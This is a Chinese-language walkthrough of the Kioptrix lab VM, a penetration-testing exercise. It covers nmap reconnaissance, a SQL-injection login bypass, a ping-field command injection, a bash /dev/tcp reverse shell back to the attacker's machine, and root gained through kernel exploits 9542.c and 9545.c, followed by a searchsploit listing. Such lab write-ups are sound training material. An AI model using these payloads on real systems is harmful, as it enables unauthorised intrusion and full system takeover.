# 1. 信息收集

> nmap

~~~shell
# ip探测

# Nmap 7.92 scan initiated Thu May  5 00:55:05 2022 as: nmap -sn -oN pingscan.txt 192.168.1.0/24
Nmap scan report for 192.168.1.1
Host is up (0.0023s latency).
MAC Address: FC:61:E9:D9:E7:AC (Fiberhome Telecommunication Technologies)
Nmap scan report for 192.168.1.3
Host is up (0.00055s latency).
MAC Address: A4:5E:60:C2:D9:0B (Apple)
Nmap scan report for 192.168.1.101
Host is up (0.00087s latency).
MAC Address: 00:0C:29:C5:81:9A (VMware)
Nmap scan report for 192.168.1.7
Host is up.
# Nmap done at Thu May  5 00:55:07 2022 -- 256 IP addresses (4 hosts up) scanned in 2.03 seconds
发现主机：192.168.1.101

# 操作系统、端口、常用漏洞探测
# Nmap 7.92 scan initiated Thu May  5 00:56:12 2022 as: nmap -n -v -sV -A -sC -T5 -p- -Pn -o scan101.txt 192.168.1.101
Nmap scan report for 192.168.1.101
Host is up (0.00099s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey:
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            707/udp   status
|_  100024  1            710/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_ssl-date: 2022-05-05T01:43:12+00:00; -3h13m33s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-10-08T00:10:47
| Not valid after:  2010-10-08T00:10:47
| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
|_http-server-header: Apache/2.0.52 (CentOS)
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
| http-methods:
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
710/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:C5:81:9A (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Uptime guess: 0.019 days (since Thu May  5 00:29:15 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=202 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: -3h13m33s

TRACEROUTE
HOP RTT     ADDRESS
1   0.99 ms 192.168.1.101

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May  5 00:56:45 2022 -- 1 IP address (1 host up) scanned in 33.63 seconds
~~~

> web服务

访问首页访问源代码，发现一个登录页面：

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/1.png" width="56%" />


~~~html
<html>
<body>
<form method="post" name="frmLogin" id="frmLogin" action="index.php">
	<table width="300" border="1" align="center" cellpadding="2" cellspacing="2">
		<tr>
			<td colspan='2' align='center'>
			<b>Remote System Administration Login</b>
			</td>
		</tr>
		<tr>
			<td width="150">Username</td>
			<td><input name="uname" type="text"></td>
		</tr>
		<tr>
			<td width="150">Password</td>
			<td>
			<input name="psw" type="password">
			</td>
		</tr>
		<tr>
			<td colspan="2" align="center">
			<input type="submit" name="btnLogin" value="Login">
			</td>
		</tr>
	</table>
</form>

<!-- Start of HTML when logged in as Administator -->
</body>
</html>
~~~
# 2. 过程
`通过分析源代码，发现用户名大概率是administrator,但是没有密码信息，尝试万能密码：`

> `payload: `
>
> `uname:administrator' or '1'='1`
>
> `psw:' or '1'='1`

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/2.png" width="56%" />

`payload:127.0.0.1;pwd;whoami;`

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/3.png" width="56%" />

寻找写权限的目录：

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/4.png" width="56%" />

> 弹shell

`payload:`

`192.168.1.7;bash -c 'exec bash -i &>/dev/tcp/192.168.1.7/8888 <&1';`

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/5.png" width="56%" />



> 提权

我试了1397.c,但是提权不成功
~~~bash
bash-3.00$ gcc -o 0x82-CVE-2009-2698 9542.c && ./0x82-CVE-2009-2698
9542.c:109:28: warning: no newline at end of file
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
bash-3.00# passwd root
New UNIX password: 123456
BAD PASSWORD: it is too simplistic/systematic
Retype new UNIX password: 123456
Changing password for user root.
passwd: all authentication tokens updated successfully.
~~~
9545.c也能成功
~~~bash
bash-3.00$ gcc -Wall -o 9545 9545.c
9545.c:376:28: warning: no newline at end of file
bash-3.00$ ls -al
total 532
drwxr-xrwx   4 root   root     4096 May  4 23:57 .
drwxr-xr-x  23 root   root     4096 May  4 22:33 ..
-rwxr-xr-x   1 apache apache   6932 May  4 22:25 0x82-CVE-2009-2698
-rwxrwxrwx   1 apache apache  17060 May  5  2022 1397.c
-rw-r--r--   1 apache apache   2535 May  5  2022 9542.c
-rwxr-xr-x   1 apache apache   6762 May  4 23:57 9545
-rw-r--r--   1 apache apache   9408 May  5  2022 9545.c
drwxrwxrwt   2 root   root     4096 May  4 21:11 .font-unix
drwxrwxrwt   2 root   root     4096 May  4 21:11 .ICE-unix
-rwxr-xr-x   1 apache apache 466816 May  4 22:13 k-rad3
bash-3.00$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ ./9545
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
~~~

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/6.png" width="56%" />

# 3. 遗留问题
**提权脚本那么多，除了一条一条的尝试之外，有没有更快捷的办法？**
~~~shell
┌──(root㉿kali)-[/mytest/kioptrix11-23]
└─# searchsploit kernel 2.6.x Local Privilege Escalation --exclude="Android|Ubuntu|macOS|Sony|windows|solaris"
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 2.4.x/2.6.x - 'Bluez' BlueTooth Signed Buffer Index Privilege Escalation (2)                                                          | linux/local/926.c
Linux Kernel 2.4.x/2.6.x - 'uselib()' Local Privilege Escalation (3)                                                                               | linux/local/895.c
Linux Kernel 2.4.x/2.6.x - BlueTooth Signed Buffer Index Privilege Escalation (1)                                                                  | linux/local/25288.c
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)               | linux_x86/local/9542.c
Linux Kernel 2.6.x (Gentoo 2.6.29rc1) - 'ptrace_attach' Local Privilege Escalation                                                                 | linux/local/8673.c
Linux Kernel 2.6.x - 'pipe.c' Local Privilege Escalation (2)                                                                                       | linux/local/33322.c
Linux Kernel 2.6.x - 'SYS_EPoll_Wait' Local Integer Overflow / Local Privilege Escalation (1)                                                      | linux/local/25202.c
Linux Kernel 2.6.x - Ext4 'move extents' ioctl Privilege Escalation                                                                                | linux/local/33395.txt
Linux Kernel 2.6.x - Ptrace Privilege Escalation                                                                                                   | linux/local/30604.c
Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - 'Mutagen Astronomy' Local Privilege Escalation                             | linux_x86-64/local/45516.c
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation                                                     | linux_x86-64/local/33516.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                                         | linux/local/41886.c
Linux Kernel < 2.6.11.5 - BlueTooth Stack Privilege Escalation                                                                                     | linux/local/4756.c
Linux Kernel < 2.6.19 (Debian 4) - 'udp_sendmsg' Local Privilege Escalation (3)                                                                    | linux/local/9575.c
Linux Kernel < 2.6.19 (x86/x64) - 'udp_sendmsg' Local Privilege Escalation (2)                                                                     | linux/local/9574.txt
Linux Kernel < 2.6.22 - 'ftruncate()'/'open()' Local Privilege Escalation                                                                          | linux/local/6851.c
Linux Kernel < 2.6.28 - 'fasync_helper()' Local Privilege Escalation                                                                               | linux/local/33523.c
Linux Kernel < 2.6.29 - 'exit_notify()' Local Privilege Escalation                                                                                 | linux/local/8369.sh
Linux Kernel < 2.6.36-rc4-git2 (x86-64) - 'ia32syscall' Emulation Privilege Escalation                                                             | linux_x86-64/local/15023.c
Linux Kernel < 2.6.37-rc2 - 'ACPI custom_method' Local Privilege Escalation                                                                        | linux/local/15774.c
Linux Kernel < 2.6.7-rc3 (Slackware 9.1 / Debian 3.0) - 'sys_chown()' Group Ownership Alteration Privilege Escalation                              | linux/local/718.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                                                                                  | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                                                                       | linux_x86-64/local/44302.c
Linux Kernel < 3.8.9 (x86-64) - 'perf_swevent_init' Local Privilege Escalation (2)                                                                 | linux_x86-64/local/26131.c
Linux Kernel < 3.8.x - open-time Capability 'file_ns_capable()' Local Privilege Escalation                                                         | linux/local/25450.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                                                                       | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                                                                  | linux/local/45553.c
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
~~~


# 4. 说明
